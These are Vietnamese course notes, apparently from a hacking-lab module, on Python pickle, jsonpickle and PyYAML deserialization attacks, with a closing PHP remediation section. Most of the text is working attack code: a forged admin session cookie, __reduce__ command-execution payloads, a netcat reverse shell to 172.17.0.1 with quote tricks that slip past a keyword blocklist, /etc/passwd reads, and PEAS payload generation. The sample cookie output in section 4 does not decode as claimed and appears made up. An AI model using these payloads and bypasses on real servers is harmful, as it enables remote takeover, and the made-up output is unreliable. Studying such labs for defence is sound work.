
---

# 9. Tấn công Object Injection trong Python (HTBooks GmbH)

#### **1. Bối cảnh và Lỗ hổng**
Trong phần trước, chúng ta đã phát hiện ra rằng trang web sử dụng một **cookie** chứa đối tượng **serialized** của lớp `util.auth.Session`, và đối tượng này được giải mã mỗi khi người dùng cố gắng truy cập trang. Lớp `Session` có một phương thức `isAdmin()` kiểm tra quyền hạn của người dùng, trả về `True` nếu người dùng là **admin**. Chúng ta có thể lợi dụng lỗ hổng này để **tiêm đối tượng** vào ứng dụng và thay đổi quyền hạn của người dùng.

#### **2. Mục tiêu**
Mục tiêu là thay đổi **role** trong đối tượng `Session` từ người dùng hiện tại thành **admin** để có thể truy cập vào **Admin Panel**. Do cookies là dữ liệu do người dùng kiểm soát, chúng ta có thể giả mạo cookie để lấy quyền quản trị viên.

#### **3. Cấu trúc Thư mục và Mã Nguồn**
Để khai thác lỗ hổng này, ta cần tạo ra cấu trúc thư mục giống như trong dự án, và sao chép mã nguồn có liên quan:

- **Cấu trúc thư mục**:
  ```
  exploit/
  ├── exploit-admin.py
  └── util/
      └── auth.py
  ```

- **Mã nguồn trong `exploit/util/auth.py`**:
  Chúng ta sẽ tạo lại lớp `Session` và hàm `sessionToCookie` cùng `cookieToSession` từ mã nguồn gốc, nhưng với một **constructor** có thể chỉ định trực tiếp `username` và `role`:
  ```python
  import pickle
  import base64
  
  class Session:
      def __init__(self, username, role):
          self.username = username
          self.role = role

  def sessionToCookie(session):
      p = pickle.dumps(session)
      b = base64.b64encode(p)
      return b

  def cookieToSession(cookie):
      b = base64.b64decode(cookie)
      for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
          if badword in b:
              return None
      p = pickle.loads(b)
      return p
  ```

- Trong `Session`, chúng ta chỉ quan tâm đến `username` và `role` và bỏ qua các phương thức không cần thiết, vì khi đối tượng được **pickle**, chỉ có giá trị của các biến này là quan trọng.

#### **4. Tạo Cookie Giả Mạo**
Chúng ta sẽ sử dụng đối tượng `Session` giả mạo, với tên người dùng là `"attacker"` và quyền là `"admin"`, rồi tạo cookie tương ứng:
```python
import util.auth

s = util.auth.Session("attacker", "admin")
c = util.auth.sessionToCookie(s)
print(c.decode())
```

Kết quả của lệnh trên sẽ là một chuỗi base64 mã hóa đối tượng `Session` mà chúng ta có thể sử dụng làm giá trị của cookie. Ví dụ kết quả có thể là:
```
gASVRgAAAAAAAACMCXV0aW4uYXV0aGVyaW4uYWRtaW4uYXBwLi5pY29zZG9u
```

#### **5. Kiểm Tra Lọc Lỗi**
Trước khi thử nghiệm trên máy chủ thực tế, chúng ta có thể kiểm tra mã trên môi trường địa phương (local) để chắc chắn rằng việc giải mã cookie hoạt động đúng:
```python
>>> import util.auth
>>> s = util.auth.cookieToSession('gASVRgAAAAAAAACMCXV0aW4uYXV0aGVyaW4uYWRtaW4uYXBwLi5pY29zZG9u')
>>> s.username
'attacker'
>>> s.role
'admin'
```
Kết quả là chúng ta có thể thấy rằng đối tượng `Session` được tạo với tên người dùng `"attacker"` và quyền `"admin"`, xác nhận rằng việc tấn công có thể thành công.

#### **6. Tấn Công Thực Tế**
Bây giờ, chúng ta có thể áp dụng cookie giả mạo vào trình duyệt của mình:
- **Bước 1**: Thay thế giá trị của cookie `auth_8bH3mjF6n9` bằng chuỗi base64 mà ta đã tạo được trong phần thử nghiệm.
- **Bước 2**: Tải lại trang **Admin Panel**.

Kết quả: Trang web sẽ giải mã cookie giả mạo và nghĩ rằng người dùng là một quản trị viên, từ đó cho phép truy cập vào **Admin Panel**.

---
# 10. Tấn công Remote Code Execution (RCE) qua Serialization (Object Injection)

#### **1. Mục tiêu**
Mục tiêu của phần này là **lợi dụng lỗ hổng trong việc giải mã đối tượng (deserialization)** để thực hiện một **Remote Code Execution (RCE)** trên máy chủ web, cho phép kẻ tấn công chạy mã lệnh từ xa.

#### **2. Kiểm tra Chức năng `cookieToSession`**
Trong hàm `cookieToSession`, chúng ta thấy rằng có một bộ lọc được áp dụng để ngăn chặn một số từ khóa, chẳng hạn như `subprocess`, `Popen`, `/bash`, `/sh`, v.v. Điều này có thể giúp ngăn chặn một số phương thức phổ biến để thực hiện lệnh hệ thống từ xa.

```python
def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
```
Tuy nhiên, vẫn có cách khác để đạt được mục tiêu **RCE** mà không bị bộ lọc phát hiện. Một trong những cách này là sử dụng **`__reduce__()`**, một hàm đặc biệt trong Python cho phép định nghĩa cách đối tượng được **pickled** và **unpickled**.

#### **3. Lợi dụng `__reduce__()` để RCE**
Khi đối tượng được **pickled**, nếu lớp của đối tượng đó có định nghĩa phương thức `__reduce__()`, phương thức này sẽ được gọi để phục hồi lại đối tượng khi giải mã. Chúng ta có thể sử dụng phương thức này để chỉ định một lệnh hệ thống cần thực thi, ví dụ như `os.system()`.

Để vượt qua bộ lọc từ khóa, chúng ta có thể tạo một **payload** với một lệnh **`ping`** để kiểm tra xem RCE có hoạt động không.

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("ping -c 5 <ATTACKER_IP>",)

r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
print(b.decode())
```

Kết quả sẽ là một chuỗi base64 được mã hóa mà chúng ta có thể sử dụng làm giá trị cookie.

#### **4. Kiểm tra Payload Local**
Khi thử nghiệm payload trên môi trường cục bộ, chúng ta có thể kiểm tra lại kết quả và xác nhận rằng lệnh `ping` được thực thi.

```python
>>> import util.auth
>>> s = util.auth.cookieToSession('gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVt...SNIP...')
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms
...
```

Lệnh `ping` đã được thực thi thành công, chứng minh rằng chúng ta đã khai thác thành công lỗ hổng **RCE** qua **deserialization**.

#### **5. Tấn công trên Target (Máy chủ Thực tế)**
Bây giờ, để thực hiện một **reverse shell**, ta sẽ thay đổi payload của mình để sử dụng một **Netcat reverse shell**. Tuy nhiên, chúng ta cần vượt qua bộ lọc từ khóa, vì `nc`, `-nv`, và `/sh` đều bị cấm.

Một trong những cách đơn giản là **chèn dấu nháy đơn** vào các từ khóa bị lọc. Bộ lọc sẽ không nhận ra các từ này nữa, và lệnh vẫn có thể được thực thi.

Ví dụ:

```python
class RCE:
    def __reduce__(self):
        return os.system, ("n''c -nv 172.17.0.1 9999 -e /bin/s''h",)
```

Kết quả base64 sẽ là:

```bash
gASVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVt...SNIP...SFlFKULg==
```

#### **6. Nhận Reverse Shell**
Bây giờ, chúng ta có thể bắt đầu một listener **Netcat** trên máy tấn công:

```bash
nc -nvlp 9999
```

Sau đó, thay đổi giá trị cookie thành chuỗi base64 mà ta đã tạo ra và tải lại trang web. Nếu tấn công thành công, chúng ta sẽ nhận được một **reverse shell**.

Output của Netcat listener có thể giống như sau:

```bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:32823.
$ ls -l
total 56
-rw-r--r--    1 root     root
...
-rw-r--r--    1 root     root 184 Oct 11 12:55 Dockerfile
```

Chúng ta đã thành công trong việc khai thác lỗ hổng và có quyền truy cập vào hệ thống thông qua reverse shell.

---

# 11. Công Cụ trong Tấn Công Deserialization Python

#### **Tình Trạng Hiện Tại của Tấn Công Deserialization trong Python**

Trong khi công cụ **PHPGGC** nổi tiếng trong hệ sinh thái PHP cho các tấn công deserialization, Python không có một công cụ phổ biến tương tự. Tuy nhiên, tấn công deserialization trong Python vẫn tương đối đơn giản và đã được tài liệu hóa tốt. Thư viện mặc định dùng để tuần tự hóa trong Python là `pickle`, nhưng cũng có các thư viện khác như **JSONPickle** và **PyYAML** cho phép tuần tự hóa dữ liệu.

---

### **JSONPickle:**

Kỹ thuật tấn công deserialization trong **JSONPickle** khá giống với **Pickle**. Cả hai đều dựa vào việc tạo một payload độc hại sử dụng phương thức `__reduce__()`, điều này có thể kích hoạt việc thực thi mã độc khi dữ liệu được deserializing.

#### **Ví Dụ:**

```python
import jsonpickle
import os

class RCE():
    def __reduce__(self):
        return os.system, ("head /etc/passwd",)

# Serialize (tạo payload)
exploit = jsonpickle.encode(RCE())
print(exploit)

# Deserialize (mã lỗ hổng)
jsonpickle.decode(exploit)
```

**Kết Quả Mong Đợi (Thực Thi Lệnh):**

Khi chạy đoạn mã trên, kết quả sẽ hiển thị phần đầu của tệp `/etc/passwd`, cho thấy rằng lệnh `head /etc/passwd` đã được thực thi thành công.

```bash
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

Để tìm hiểu thêm về tấn công **JSONPickle** và **Pickle**, bạn có thể tham khảo các liên kết sau:
- [Exploiting Python Pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [Into the Jar: JSONPickle Exploitation](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)

---

### **YAML (PyYAML, ruamel.yaml):**

Các thư viện như **PyYAML** và **ruamel.yaml** tuần tự hóa dữ liệu ở định dạng **YAML**. Tương tự như với **Pickle** và **JSONPickle**, việc deserialization các đối tượng với phương thức `__reduce__()` có thể dẫn đến việc thực thi mã độc (RCE) khi dữ liệu tuần tự hóa được tải mà không có sự kiểm tra hợp lệ.

#### **Ví Dụ với PyYAML:**

```python
import yaml
import subprocess

class RCE():
    def __reduce__(self):
        return subprocess.Popen, (["head", "/etc/passwd"],)

# Serialize (tạo payload)
exploit = yaml.dump(RCE())
print(exploit)

# Deserialize (mã lỗ hổng)
yaml.load(exploit, Loader=yaml.FullLoader)
```

**Kết Quả Mong Đợi (Thực Thi Lệnh):**

Mặc dù sẽ xuất hiện một thông báo lỗi khi cố gắng deserialization, lệnh `head /etc/passwd` vẫn được thực thi, chứng tỏ rằng tấn công đã thành công.

Mặc dù thông báo lỗi dài xuất hiện, kết quả của lệnh `head /etc/passwd` vẫn được thực thi, hiển thị thông tin nhạy cảm:

```bash
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

Để tìm hiểu thêm về các tấn công deserialization trong YAML:
- [YAML Deserialization Attack in Python](https://net-square.com/yaml-deserialization-attack-in-python.html)
- [Exploit-DB: YAML Deserialization Attack in Python](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)

---

### **PEAS (Python Exploit Anti-Serialization)**

PEAS là một bộ công cụ đa năng có thể tạo ra payloads tấn công deserialization cho các thư viện như **JSONPickle**, **PyYAML**, và **ruamel.yaml**. Nó giúp các nhà nghiên cứu bảo mật nhanh chóng tạo ra và kiểm tra các payload tấn công, làm cho nó trở thành công cụ thiết yếu để khai thác các lỗ hổng deserialization trong các ứng dụng Python.

#### **Cài Đặt:**

```bash
git clone https://github.com/j0lt-github/python-deserialization-attack-payload-generator.git
cd python-deserialization-attack-payload-generator/
pip3 install -r requirements.txt
```

Sau khi cài đặt, PEAS có thể tạo ra các payload cho nhiều thư viện tuần tự hóa khác nhau như **Pickle**, **PyYAML**, và **JSONPickle**.

#### **Ví Dụ:**

Khi chạy PEAS để tạo payload cho **Pickle**, bạn sẽ thấy quá trình như sau:

```bash
python3 peas.py
Enter RCE command: n''c -nv 172.17.0.1 9999 -e /bin/sh
Enter operating system of target [linux/windows]: linux
Want to base64 encode payload? [N/y]: y
Enter file location and name to save: /tmp/payload
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All): pickle
```

Sau khi tạo payload, bạn có thể thiết lập một **Netcat listener** để nhận kết nối reverse shell.

```bash
nc -nvlp 9999
```

---

### **Thử Thách và Sửa Đổi Trong PEAS**

Trong quá trình thử nghiệm, một số bộ lọc có thể chặn các payload nhất định (như `subprocess.Popen`). Để vượt qua các bộ lọc này, bạn có thể cần phải sửa đổi mã trong PEAS bằng cách thay thế `subprocess.Popen` bằng `os.system`, điều này sẽ giúp tránh kích hoạt bộ lọc đen.

#### **Ví Dụ Sửa Đổi:**

Thay thế `subprocess.Popen` bằng `os.system` trong mã của PEAS:

```python
#import subprocess
import os

# Sửa lại phương thức __reduce__ để sử dụng os.system
return (os.system, (self.payload,))
```

Sau khi sửa mã, bạn có thể tạo lại payload và thử nghiệm lại. Reverse shell sẽ được thực thi thành công.

---

# 12. Tránh Các Lỗ Hổng Deserialization trong HTBank (PHP)

#### **Giới thiệu về các Định dạng Dữ liệu An toàn**

Ở phần trước, chúng ta đã sửa lỗ hổng deserialization bằng cách sử dụng HMACs (Hash-based Message Authentication Codes). Tuy nhiên, dù có biện pháp bảo mật này, kết hợp với các lỗ hổng khác như Local File Inclusion (LFI), chúng ta vẫn có thể khai thác và thực thi mã độc từ xa (Remote Code Execution - RCE).

Trong cả Python và PHP, lỗ hổng deserialization xảy ra khi gọi các hàm như `unserialize()`, `pickle.loads()`, `yaml.load()`, v.v. Tuy nhiên, nếu chúng ta thay thế những hàm này bằng các định dạng dữ liệu an toàn hơn như **JSON** hoặc **XML** và tránh sử dụng các hàm deserialization, thì các vấn đề này sẽ được giải quyết.

Trong phần này, chúng ta sẽ cập nhật **HTBank (PHP)** để sử dụng JSON thay vì deserialization, nhằm bảo vệ ứng dụng khỏi các lỗ hổng tương tự. Tuy nhiên, chúng ta cũng phải xử lý các lỗ hổng khác như XSS, command injection và arbitrary file upload, vì việc chỉ chuyển sang định dạng JSON không thể giải quyết tất cả vấn đề.

---

#### **Cập nhật HTBank**

1. **Xóa file `app/Helpers/UserSettings.php`**: Do chúng ta không còn cần đến lớp `UserSettings` để tạo và đọc các đối tượng JSON nữa, nên chúng ta sẽ xóa lớp này.

2. **Cập nhật `app/Http/Controllers/HTController.php`**:
   - Khi xử lý xuất (export) thông tin người dùng, thay vì tạo đối tượng `UserSettings` và serialize, chúng ta sẽ tạo một mảng các cặp khóa => giá trị với thông tin tương tự và sau đó chuyển mảng này thành định dạng JSON bằng `json_encode()`.
   - Khi nhập (import) dữ liệu, thay vì deserializing đối tượng `UserSettings`, chúng ta sẽ giải mã (decode) đối tượng JSON bằng `json_decode()` và cập nhật người dùng với các giá trị này.

   **Ví dụ mã sau khi cập nhật**:

   ```php
   public function handleSettingsIE(Request $request) {
       if (Auth::check()) {
           if (isset($request['export'])) {
               $user = Auth::user();
               $userSettings = array("name" => $user->name, "email" => $user->email, "password" => $user->password, "profile_pic" => $user->profile_pic);
               $exportedSettings = base64_encode(json_encode($userSettings));

               // Ghi thông tin serialized vào file log
               $fp = fopen("/tmp/htbank.log", "a");
               fwrite($fp, date("[d.m.Y H:i:s]") . " Serialized user '" . $user->name . "'\n");
               fclose($fp);

               Session::flash('ie-message', 'Exported user settings!');
               Session::flash('ie-exported-settings', $exportedSettings);
           }
           else if (isset($request['import']) && !empty($request['settings'])) {
               $userSettings = json_decode(base64_decode($request['settings']));
               $user = Auth::user();
               $user->name = $userSettings->name;
               $user->email = $userSettings->email;
               $user->password = $userSettings->password;
               $user->profile_pic = $userSettings->profile_pic;
               $user->save();

               Session::flash('ie-message', "Imported settings for '" . $userSettings->name . "'");
           }
           return back();
       }
       return redirect("/login")->withSuccess('You must be logged in to complete this action');
   }
   ```

---

3. **Xác thực tải lên tệp (file upload validation)**:
   Để chỉ cho phép tải lên hình ảnh (chỉ JPG), chúng ta sẽ thêm bước xác thực để đảm bảo chỉ các tệp hình ảnh hợp lệ được tải lên.

   ```php
   if (!empty($request["profile_pic"])) {
       $request->validate(['profile_pic' => 'required|image']);
       $file = $request->file('profile_pic');
       $fname = md5(random_bytes(20));
       $file->move('uploads', "$fname.jpg");
       $user->profile_pic = "uploads/$fname.jpg";
   }
   ```

   **Trong view** (`settings.blade.php`), chúng ta cũng sẽ hiển thị thông báo lỗi nếu ảnh tải lên không hợp lệ:

   ```html
   <div class="form-group mb-3">
       <label for="ppic">Update profile picture (Only JPG)</label>
       <input type="file" class="form-control-file" id="ppic" name="profile_pic">
       @if ($errors->has('profile_pic'))
           <span class="text-danger">{{ $errors->first('profile_pic') }}</span>
       @endif
   </div>
   ```

---

4. **Cập nhật để ngăn chặn XSS**:
   Để ngăn ngừa lỗ hổng XSS (Cross-Site Scripting) trong trang settings, thay vì sử dụng `!!` để xuất HTML trực tiếp, chúng ta sẽ thay bằng `{{ ... }}` để tự động escape dữ liệu và ngăn chặn XSS.

   **Trong template `settings.blade.php`**, thay đổi từ:

   ```html
   {!! Session::get('ie-message') !!}
   ```

   Thành:

   ```html
   <p class="text-success">{{ Session::get('ie-message') }}</p>
   ```

---

5. **Cập nhật PHP lên phiên bản mới**:
   Để ngăn PHP tự động deserializing PHAR metadata, bạn cần nâng cấp phiên bản PHP của dự án lên ít nhất phiên bản 8.0, nơi tính năng này đã được tắt mặc định.

---

### **Kết Quả và Kiểm Tra**

Sau khi thực hiện tất cả các thay đổi, các lỗ hổng deserialization, XSS, command injection và arbitrary file uploads đều được xử lý. Khi thử xuất (export) cài đặt người dùng, bạn sẽ nhận được giá trị mã hóa base64 của một đối tượng JSON như sau:

```bash
eyJuYW1lIjoicGVudGVzdCIsImVtYWlsIjoicGVudGVzdEB0ZXN0LmNvbSIsInBhc3N3b3JkIjoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIiwicHJvZmlsZV9waWMiOiJ1cGxvYWRzXC83ZTRjMDkwZjdhMjBkMmI5YmVkYmE3ZG...
```

Giải mã base64 sẽ trả về đối tượng JSON an toàn, không có khả năng bị lợi dụng cho các tấn công như trước.

Kết quả trong log (`/tmp/htbank.log`) sẽ không còn chứa các chuỗi mã độc, và các payload độc hại sẽ không thể được thực thi nữa.
